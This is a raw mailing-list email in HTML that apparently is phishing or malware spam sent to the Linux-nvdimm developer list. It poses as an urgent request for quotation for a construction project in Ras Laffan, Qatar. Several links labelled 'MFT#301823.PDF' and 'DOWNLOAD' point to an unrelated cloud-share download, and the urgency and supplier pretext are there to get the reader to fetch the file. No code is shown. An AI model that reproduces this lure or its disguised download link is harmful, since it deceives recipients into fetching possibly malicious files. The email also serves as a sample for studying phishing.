Return-Path: <linux-nvdimm-bounces@lists.01.org>
X-Original-To: lists+linux-nvdimm@lfdr.de
Delivered-To: lists+linux-nvdimm@lfdr.de
Received: from ml01.01.org (ml01.01.org [198.145.21.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 26BB714BCBD
	for <lists+linux-nvdimm@lfdr.de>; Tue, 28 Jan 2020 16:22:13 +0100 (CET)
Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
	by ml01.01.org (Postfix) with ESMTP id 496781007B8ED;
	Tue, 28 Jan 2020 07:25:29 -0800 (PST)
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=178.156.202.118; helo=slot0.apsainae.tk; envelope-from=postmaster@apsainae.tk; receiver=<UNKNOWN> 
Received: from slot0.apsainae.tk (unknown [178.156.202.118])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ml01.01.org (Postfix) with ESMTPS id 7DF591007B8EC
	for <linux-nvdimm@lists.01.org>; Tue, 28 Jan 2020 07:25:26 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=apsainae.tk;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=postmaster@apsainae.tk;
 bh=Z3kdjRmOdzlx7FKtHLHI84GJ+wI=;
 b=H+OriBN7A8omWlGseyVnUIE87t7IIyX0pYIMIkPVNDA0x6pTHT4m5cC5wXyyZWsl9vjKrbUcQ8sJ
   uWn04LFR7aRQ7oSnp+vAW5Rly8nWEMuw7Jg5PHQp8eRKnmeXa2jrYP+yPLZI1psNiEMSwPcR/v3t
   1hkGRjslZzDPMJxGg29L65jTCZXmnl4K8XVDMgwV6Vt9I9k+LiudvuwTNYBVFUKDBnEYSKo/z9D1
   DY48jbBZqh7n25VnsZdghHxSK8iQB8st6CBoCPKsx9lFS1LCIyTybi3zRff9eqEaCZH37Ragf0R0
   WTkcipUHPZVyJUCeWsve+tamsEDcq8qFE1q8CQ==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=apsainae.tk;
 b=BwRCRoSha+zDQxpintleFEkc9tuwSJdIIAMPDeBDsCLrjv9ThEQTmbLBHPchUC86sxFkhyxjeSYo
   BruCh2HzrlXONyqMS3xkDwDnF4XyPKoEU+3AdcUmqQO8Ze0ySQ21KApIBCrJhQbUXu1dF2ePJ08z
   V16Ri4zWW8dHFTM7/AZZz9Tz9Dikyc8/ViUSe3WzKLBVEjdPVJyvVn5YJ0Ro3FI/4JJ1rjBFqYix
   ZtEtxSH4wz+gJ5Q/0UgJQcjIUbNAQG8BdN2rGshhijCOglAtrwBN014fCAFwmIQ9OHHjedEkrnWm
   SO407jXpIPz6heNI0a4ewVUw+SVkP2LIx6B41g==;
From: Syed Farhan <postmaster@apsainae.tk>
To: linux-nvdimm@lists.01.org
Subject: RE: RFQ-NFE-EWS- MFT#301823.PDF
Date: 28 Jan 2020 15:36:30 -0800
Message-ID: <20200128153629.27EF88D3A65145BA@apsainae.tk>
MIME-Version: 1.0
Message-ID-Hash: 4JYQWVPPT4UOHWPVBUJKLFJUPWTS2ZNW
X-Message-ID-Hash: 4JYQWVPPT4UOHWPVBUJKLFJUPWTS2ZNW
X-MailFrom: postmaster@apsainae.tk
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
X-Mailman-Version: 3.1.1
Precedence: list
List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/4JYQWVPPT4UOHWPVBUJKLFJUPWTS2ZNW/>
List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
List-Post: <mailto:linux-nvdimm@lists.01.org>
List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
Content-Type: multipart/mixed; boundary="===============0774037236468646759=="

--===============0774037236468646759==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18666"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; MARGIN: 0in 0in 0pt'><SPAN lang=3DEN-GB =
style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans-serif">Dear,<U></U><U>=
</U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif"><U></U><U></U></SPAN>&nbsp;</P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; TEXT-ALIGN: justify; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt=
; FONT-FAMILY: Calibri, sans-serif; BACKGROUND: yellow">Urgent</SPAN><SPAN =
lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans-serif"><U=
></U><U></U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; TEXT-ALIGN: justify; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt=
; FONT-FAMILY: Calibri, sans-serif">Kindly provide us your most competitive=
 quotation &amp; advise the availability for the<SPAN>&nbsp;</SPAN><U><SPAN=
 style=3D"COLOR: red">MFT#301823</SPAN></U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; TEXT-ALIGN: justify; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'><U><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 1=
1pt; FONT-FAMILY: Calibri, sans-serif; COLOR: red"><U></U><SPAN style=3D"TE=
XT-DECORATION: none"></SPAN><U></U></SPAN></U>&nbsp;</P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; TEXT-ALIGN: justify; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'><U><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 1=
1pt; FONT-FAMILY: Calibri, sans-serif; COLOR: red">Note: need your quote/pr=
ice per cubic meter(m3).</SPAN></U><SPAN lang=3DEN-GB><U></U><U></U></SPAN>=
</P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; TEXT-ALIGN: justify; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt=
; FONT-FAMILY: Calibri, sans-serif"><BR><SPAN>&nbsp;<A href=3D"https://king=
sdoggy.blaucloud.de/index.php/s/pFOzBxPpvnmU5VB/download">MFT#301823.PDF</A=
><BR><BR></SPAN><STRONG><U><A href=3D"https://kingsdoggy.blaucloud.de/index=
=2Ephp/s/pFOzBxPpvnmU5VB/download">DOWNLOAD</A></U></STRONG>&nbsp;<SPAN>&nb=
sp;</SPAN><U><SPAN style=3D"COLOR: red"><A href=3D"https://kingsdoggy.blauc=
loud.de/index.php/s/pFOzBxPpvnmU5VB/download">MFT#301823.PDF</A>
</SPAN></U><BR><BR></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">Project: Early Site Works for the NFE Onshore Project - RLIC &=
#8211; Qatar</SPAN><SPAN lang=3DEN-GB><U></U><U></U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">Job Location: RAS LAFFAN</SPAN><SPAN lang=3DEN-GB><U></U><U></=
U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">&nbsp;&nbsp;</SPAN><SPAN lang=3DEN-GB style=3D"COLOR: rgb(31,7=
3,125)"><U></U><U></U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">Regards</SPAN><SPAN lang=3DEN-GB><U></U><U></U></SPAN></P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">Syed Farhan Ali</SPAN><SPAN lang=3DEN-GB><U></U><U></U></SPAN>=
</P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">NFE-EWS Project</SPAN><SPAN lang=3DEN-GB><U></U><U></U></SPAN>=
</P>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><SPAN lang=3DEN-GB style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif">Mob: +974 30242675</SPAN><SPAN lang=3DEN-GB><U></U><U></U></SP=
AN></P>
<DIV class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FO=
NT-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE:=
 normal; TEXT-ALIGN: center; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LE=
TTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial' align=3Dcenter>
<HR align=3Dcenter SIZE=3D3 width=3D"100%">
</DIV>
<P class=3Dm_6912130055441677874wordsection1 style=3D'FONT-SIZE: 12pt; FONT=
-FAMILY: "Times New Roman", serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
ormal; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color:=20
initial'><I><SPAN style=3D"COLOR: gray">
This email and any attachments to it may be confidential and are intended s=
olely for the use of the recipient(s). If you are not the intended recipien=
t of this email, you must neither take any action based upon its content, n=
or copy or show it to anyone. Please contact the sender if you believe you =
have received this email in error. Statements and opinions expressed in thi=
s e-mail are those of the sender, and do not necessarily reflect those of C=
CC unless explicitly so mentioned. FYI, CCC=20
regularly deploys anti-virus and malicious software protection, we however =
cannot accept any liability for damage caused by any virus / error transmit=
ted by this email.</SPAN></I></P></BODY></HTML>
--===============0774037236468646759==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
To unsubscribe send an email to linux-nvdimm-leave@lists.01.org

--===============0774037236468646759==--
